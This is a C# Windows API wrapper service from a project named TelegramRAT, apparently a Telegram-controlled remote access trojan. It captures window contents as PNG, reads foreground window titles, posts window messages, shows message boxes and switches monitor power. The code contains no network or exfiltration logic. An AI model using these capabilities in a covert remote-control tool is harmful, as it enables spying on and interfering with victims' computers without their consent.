using System.Drawing;
using System.Text;
using TelegramRAT.Utilities;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace TelegramRAT.Services;

public interface IWinApiService
{
    Rectangle GetScreenBounds();
    string GetWindowsVersion();
    IntPtr GetForegroundWindow();
    string GetWindowTitle(IntPtr hWnd);
    bool IsWindow(IntPtr hWnd);
    Rectangle GetWindowBounds(IntPtr hWnd);
    int GetProcessId(IntPtr procHandle);
    IntPtr GetProcessHandleFromWindow(IntPtr hWnd);
    void PostMessage(IntPtr hWnd, int msg, int wParam, int lParam);
    bool GetCursorPos(out Point pt);
    int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    Task<int> ShowMessageBoxAsync(string text, string caption, WinAPI.MsgBoxFlag flag);
    bool TryBroadcastMonitorPowerState(int state, out bool timedOut);
    IntPtr FindWindow(string className, string caption);
    void CaptureWindow(IntPtr hWnd, Stream buffer);
}

public class WinApiService : IWinApiService
{
    public Rectangle GetScreenBounds() => Utilities.WinAPI.GetScreenBounds();
    public string GetWindowsVersion() => Utilities.Utils.GetWindowsVersion();
    public IntPtr GetForegroundWindow() => Utilities.WinAPI.GetForegroundWindow();
    public string GetWindowTitle(IntPtr hWnd) => Utilities.WinAPI.GetWindowTitle(hWnd);
    public bool IsWindow(IntPtr hWnd) => Utilities.WinAPI.IsWindow(hWnd);
    public Rectangle GetWindowBounds(IntPtr hWnd) => Utilities.WinAPI.GetWindowBounds(hWnd);
    public int GetProcessId(IntPtr procHandle) => Utilities.WinAPI.GetProcessId(procHandle);
    public IntPtr GetProcessHandleFromWindow(IntPtr hWnd) => Utilities.WinAPI.GetProcessHandleFromWindow(hWnd);
    public void PostMessage(IntPtr hWnd, int msg, int wParam, int lParam) => Utilities.WinAPI.PostMessage(hWnd, msg, wParam, lParam);
    public bool GetCursorPos(out Point pt) => Utilities.WinAPI.GetCursorPos(out pt);
    public int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni) => Utilities.WinAPI.SystemParametersInfo(uAction, uParam, lpvParam, fuWinIni);
    public async Task<int> ShowMessageBoxAsync(string text, string caption, WinAPI.MsgBoxFlag flag) => await Utilities.WinAPI.ShowMessageBoxAsync(text, caption, flag);
    public bool TryBroadcastMonitorPowerState(int state, out bool timedOut) => Utilities.WinAPI.TryBroadcastMonitorPowerState(state, out timedOut);
    public IntPtr FindWindow(string className, string caption) => Utilities.WinAPI.FindWindow(className, caption);

    public void CaptureWindow(IntPtr hWnd, Stream buffer)
    {
        if (!WinAPI.GetClientRect(hWnd, out Rectangle windowbounds))
        {
            throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to retrieve window bounds.");
        }

        using var windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);
        using var wndGraphics = Graphics.FromImage(windowCap);

        IntPtr graphicsDc = IntPtr.Zero;
        IntPtr windowDc = IntPtr.Zero;

        try
        {
            graphicsDc = wndGraphics.GetHdc();
            windowDc = WinAPI.GetDC(hWnd);

            if (windowDc == IntPtr.Zero)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to acquire window device context.");
            }

            WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);
        }
        finally
        {
            if (graphicsDc != IntPtr.Zero)
            {
                wndGraphics.ReleaseHdc();
            }

            if (windowDc != IntPtr.Zero)
            {
                WinAPI.ReleaseDC(hWnd, windowDc);
            }
        }

        windowCap.Save(buffer, System.Drawing.Imaging.ImageFormat.Png);
    }
}
